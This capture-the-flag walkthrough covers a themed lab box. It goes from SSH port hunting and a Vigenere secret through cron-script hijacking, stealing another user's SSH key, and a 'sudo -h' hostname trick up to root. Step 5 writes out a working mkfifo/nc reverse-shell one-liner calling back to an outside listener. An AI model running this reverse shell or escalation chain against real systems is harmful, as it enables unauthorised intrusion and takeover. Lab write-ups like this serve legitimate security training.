We got a lot ports open.

***

There are lots of ssh port open. When loggin into it it says lower or higher. Higher means the correct port is lower than the current one and lower means the correct port is higher. 
Finally found correct port by trial and error and navigating using higher and lower. Port 13933.


```
You've found the real service.

Enter Secret:
```

I found that it was Vigenere Cipher.
Tried to decrypt automatically and got a secret key. https://www.boxentriq.com/code-breaking/vigenere-cipher.


```
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is bewareTheJabberwock
```
After giving secret key got a username and password. This password changes evertime the machine resetted or restarted. So to get the correct password again give the secret key again.

## SSH jabberwocky

1. With new username and password got ssh to victim normally.
2. You can find user.txt in home directory. It is reversed. Reverse the user.txt. https://codebeautify.org/reverse-string.
3. When you look `/etc/crontab` we could see its invoking `tWasBrillig.sh` which is in our home directory.
4. We are able to edit it.
5. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f" > tWasBrillig.sh`
6. Then start nc listner on port 1234.
7. When run `sudo -l` we have restart permission.
8. Lets restart it.

## nc tweedledum

1. After restart is completed we have shell as tweedledum.
2. In home directory we have `humptydumpty.txt` file with some encrypted text.

```
3. With https://crackstation.net/ we were able to decode these except last line.
4. Copy last line of `humptydumpty.txt` got to cyberchef. It was in hexx format. After decoding we were able to get the password.

## humptydumpty

1. `su humptuydumpty` and give retrieved password.
2. Now we are humptydumpty user.
3. We don't have any sudo permission but we could read user alice's ssh key.
4. Copy the ssh key `cat /home/alice/.ssh/rsa_key`

## ssh alice

1. Now we can into alice with the ssh key retrived.
2. When we checked `sudo -l` it asked for password. But we don't know.
3. But there is other method to check this. `cd /etc/sudoers.d/`
4. Then `cat alice`. We could see we can `/bin/bash` but the hostname is changed to `ssalg-gnikool`
5. We can change hostname with `-h` flag.
6. `sudo -h ssalg-gnikool -l`
7. Now its working.
8. Type command. `sudo -h ssalg-gnikool /bin/bash`.
9. Now we are root.

## root

1. Go to home directory of root and we can find `root.txt`
2. The content is reversed.
3. Use https://codebeautify.org/reverse-string to get correct flag.
